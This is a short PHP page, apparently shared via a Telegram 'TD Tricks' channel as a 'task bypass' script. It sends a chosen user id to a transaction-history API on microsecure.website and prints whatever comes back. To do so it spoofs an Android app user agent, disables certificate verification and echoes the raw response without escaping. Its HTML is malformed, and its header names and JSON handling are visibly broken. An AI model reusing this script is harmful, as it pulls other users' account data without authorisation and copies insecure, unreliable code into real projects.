<html><head><meta name="viewport" content="width=device-width"><link href="https://fonts.googleapis.com/css?family=Allura|Rancho|Mr+Dafoe|Nothing+You+Could+Do|Oleo+Script|Pinyon+Script|Yatra+One" rel="stylesheet"><link href="styles.css" rel="stylesheet"><title>TASK BYPASS||TD TRICKS</title></head><body style='background-color: #f8f8ff;font-family:Oleo Script;'>

</style></head>
<center><div class='error'></head><center><a href='https://t.me/TD_Tricks'><font color='red'>JOIN TELEGRAM FOR MORE SCRIPTS</font></a></center></form></div></form></div>
<html><head><meta name="viewport" content="width=device-width">
<?php

error_reporting(0);




$hostt= $_REQUEST['hostt'];
$ad= $_REQUEST['ad'];
$user= $_REQUEST['user'];

{
	$url1="https://microsecure.website/$hostt/api/getDomesticHistory/";

$data1="user_id=$user";

$headers[]='Content-Tyep: application/x-www-form-urlencoded';
$headers[]='Content-Tyep: application/json; charset=utf-8';
$headers[]='User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0; era 2 Build/MRA58K)';
$headers[]='Host: microsecure.website';
$headers[]='Connection: Keep-Alive';

$ch=curl_init();
curl_setopt($ch, CURLOPT_URL,$url1);
curl_setopt($ch, CURLOPT_HEADER,0);
curl_setopt($ch, CURLOPT_HTTPHEADER,$headers);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,$data1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
	$output= curl_exec ($ch);
	$json=json_decode($output,true);
	curl_close ($ch);
		$user=$json['content'];
	$ref=$json['content']['username'];
	$reff=$json['content']['parent_id'];
	
	$sts=$json['status'];

	$msg=$json['transaction_id'];	

	$stss=$json['content']['[']['transaction_id'][']'];

	$stsss=$json['content']['account_id'];

echo "<fieldset><div><font color='blue' size='3'>$output</font></div></fieldset>";

  }




?>
